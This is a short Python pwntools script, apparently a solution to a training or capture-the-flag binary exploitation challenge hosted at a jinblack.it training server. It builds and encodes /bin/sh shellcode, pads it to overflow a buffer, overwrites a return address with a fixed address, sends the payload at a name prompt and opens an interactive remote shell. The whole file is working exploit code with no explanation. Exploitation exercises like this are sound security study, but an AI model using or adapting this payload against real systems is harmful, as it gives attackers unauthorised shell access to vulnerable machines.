from pwn import *


context.clear(arch='amd64',os='linux')
run_local = False
if run_local:
	s = ssh(host='localhost',user='acidburn',port=2222)
	r= s.process('/home/acidburn/Desktop/malicious/shell/1/shellcode')
	#pid=gdb.attach(r)
	#input("wait")
else:
	r=remote("bin.training.jinblack.it",2001)




#sc = shellcraft.execve(path="/bin/cat",argv=["/bin/cat","flag"])
sc= shellcraft.sh()

sc=asm(sc)

sc_encoded=pwnlib.encoders.encoder.encode(sc,b'binsh')

#sc_encoded=pwnlib.encoders.encoder.scramble(sc)

shellcode = sc_encoded

shellcode = shellcode.ljust(1016, b"A") + p64(0x0601080)

print(r.recvuntil(b"What is your name?\n"))
r.send(shellcode)

r.interactive()

